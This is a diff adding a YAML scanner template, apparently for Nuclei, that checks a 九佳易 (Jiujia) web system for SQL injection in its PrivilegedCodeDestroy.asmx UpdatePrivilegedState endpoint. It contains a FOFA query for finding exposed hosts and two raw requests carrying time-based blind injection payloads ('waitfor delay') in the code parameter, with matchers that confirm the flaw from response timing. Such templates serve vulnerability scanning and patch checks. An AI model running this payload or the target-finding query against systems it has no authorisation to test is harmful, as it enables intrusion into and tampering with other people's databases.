@@ -1,0 +1,23 @@
+id: jiujia-clothing-privilegedcodedestroy-sqli
+info:
+  name: "九佳易PrivilegedCodeDestroy.asmx接口SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/XiTong/Index/W_IndexPbForm.win.js"
+      该系统PrivilegedCodeDestroy.asmx接口存在SQL注入漏洞，攻击者可通过构造恶意输入执行任意SQL命令，导致数据库信息泄露或篡改。漏洞源于未对用户输入进行充分过滤，允许在特定参数中注入恶意SQL语句。
+  tags: 九佳易
+http:
+- raw:
+  - |
+    GET /Interface/licx/PrivilegedCodeDestroy.asmx/UpdatePrivilegedState?code=%27+%3Bwaitfor+delay+%270%3A0%3A5%27+--+q HTTP/1
+    Host: {{Hostname}}
+  - |
+    GET /Interface/licx/PrivilegedCodeDestroy.asmx/UpdatePrivilegedState?code=%27+%3Bwaitfor+delay+%270%3A0%3A8%27+--+q HTTP/1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
